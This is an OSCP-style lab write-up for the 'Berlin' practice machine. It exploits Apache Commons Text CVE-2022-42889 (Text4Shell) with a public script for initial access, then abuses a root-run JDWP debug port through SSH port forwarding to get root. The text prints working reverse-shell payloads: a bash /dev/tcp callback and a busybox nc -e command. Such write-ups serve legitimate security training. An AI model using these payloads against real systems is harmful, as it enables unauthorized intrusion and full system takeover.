##### Tags: `JDWP`  `ssh port forwarding`  `CVE-2022-42889` 

# 🐧OSCP-B (Berlin)🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.158.150           
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat (language: en)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 8080 is a tomcat webpage
```console
$ curl -i http://192.168.152.150:8080
HTTP/1.1 200 
Content-Type: text/plain;charset=UTF-8
Content-Length: 19
Date: Sun, 14 Jun 2026 13:48:44 GMT

{"api-status":"up"}
```
gobuster found /CHANGELOG endpoint
```console
$ gobuster dir -u http://192.168.1528.150:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -b 404                     
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.158.150:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/search               (Status: 200) [Size: 25]
/error                (Status: 500) [Size: 105]
/CHANGELOG            (Status: 200) [Size: 194]
```
Apache Commons Text 1.8 has CVE-2022-42889  
```console
$ curl http://192.168.158.150:8080/CHANGELOG

# Changelog

Version 0.2
- Added Apache Commons Text 1.8 Dependency for String Interpolation

Version 0.1
- Initial beta version based on Spring Boot Framework
- Added basic search functionality
```
found the exploit on github
```console
https://github.com/Goultarde/CVE-2022-42889-text4shell
```
execute the script
```console
$ python3 text4shll.py -t 192.168.158.150 -p 8080 -L 192.168.45.184 -P 443 -u /search/ -param query

------------------------------------------------------------
CVE-2022-42889 - Text4Shell RCE Exploit (Final Fixed)
------------------------------------------------------------
[*] Payload (décodé) : ${script:javascript:var p=java.lang.Runtime.getRuntime().exec(['bash','-c','bash -c \'exec bash -i >& /dev/tcp/192.168.45.184/443 0>&1\''])}
[*] URL finale : http://192.168.158.150:8080/search/?query=%24%7Bscript%3Ajavascript%3Avar%20p%3Djava.lang.Runtime.getRuntime%28%29.exec%28%5B%27bash%27%2C%27-c%27%2C%27bash%20-c%20%5C%27exec%20bash%20-i%20%3E%26%20/dev/tcp/192.168.45.184/443%200%3E%261%5C%27%27%5D%29%7D
[+] Code de réponse : 200
[+] Réponse : {"query":"${script:javascript:var p=java.lang.Runtime.getRuntime().exec(['bash','-c','bash -c \'exec bash -i >& /dev/tcp/192.168.45.184/443 0>&1\''])}","result":""}
```
got the dev shell
```console
$ penelope -p 443
[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.2.15 • 172.17.0.1 • 192.168.45.184
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from oscp 192.168.158.150 Linux-x86_64 👤 dev(1001) • Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
[+] Logging to /home/ming/.penelope/sessions/oscp~192.168.158.150-Linux-x86_64/2026_06_15-14_50_36-593.log
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
dev@oscp:/$ id
uid=1001(dev) gid=1001(dev) groups=1001(dev)
```
## Privilege Escalation
found there is a port 8000 service running on localhost
```console
dev@oscp:~$ ss -nltp
State       Recv-Q      Send-Q           Local Address:Port             Peer Address:Port      Process                              
LISTEN      0           1                    127.0.0.1:8000                  0.0.0.0:*                                              
LISTEN      0           4096             127.0.0.53%lo:53                    0.0.0.0:*                                              
LISTEN      0           128                    0.0.0.0:22                    0.0.0.0:*                                              
LISTEN      0           50                           *:5000                        *:*                                              
LISTEN      0           100                          *:8080                        *:*          users:(("java",pid=841,fd=11))      
LISTEN      0           128                       [::]:22                       [::]:*          
```
port 8000 is running Java Debug Wire Protocol (JDWP)  
the service is running by root
```console
dev@oscp:~$ ps auxww | grep 8000
root         859  0.0  1.7 2528964 34828 ?       Ssl  12:17   0:00 java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
dev        40391  0.0  0.1   6608  2360 pts/0    S+   14:42   0:00 grep --color=auto 8000
```
found the exploit script from exploitdb
```console
https://www.exploit-db.com/exploits/46501
```
doing port forwarding to access the service from kali
```console
dev@oscp:~$ ssh -f -N -R 18000:127.0.0.1:8000 ming@192.168.45.184
ming@192.168.45.184's password: 
```
runing the script
```console
$ python2 -u 46501.py -t 127.0.0.1 -p 18000 --cmd 'busybox nc 192.168.45.184 80 -e sh'
[+] Targeting '127.0.0.1:18000'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.16'
[+] Found Runtime class: id=850
[+] Found Runtime.getRuntime(): id=7f3978390d78
[+] Created break event id=2
[+] Waiting for an event on 'java.net.ServerSocket.accept'
[+] Received matching event from thread 0x8ec
[+] Selected payload 'busybox nc 192.168.45.184 80 -e sh'
[+] Command string object created id:8ed
[+] Runtime.getRuntime() returned context id:0x8ee
[+] found Runtime.exec(): id=7f3978390db0
[+] Runtime.exec() successful, retId=8ef
[!] Command successfully executed
```
we know port 5000 is listening from external  
we can trigger it with nc
```console
dev@oscp:~$ nc 127.0.0.1 5000
Available Processors: 1
Free Memory: 25537048
Total Memory: 32440320
```
then we got the root shell
```console
$ penelope -p 80      
[+] Listening for reverse shells on 0.0.0.0:80 →  127.0.0.1 • 10.0.2.15 • 172.17.0.1 • 192.168.45.184
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from oscp 192.168.158.150 Linux-x86_64 👤 root(0) • Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
[+] Logging to /home/ming/.penelope/sessions/oscp~192.168.158.150-Linux-x86_64/2026_06_15-15_27_17-379.log
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@oscp:/# id
uid=0(root) gid=0(root) groups=0(root)
```
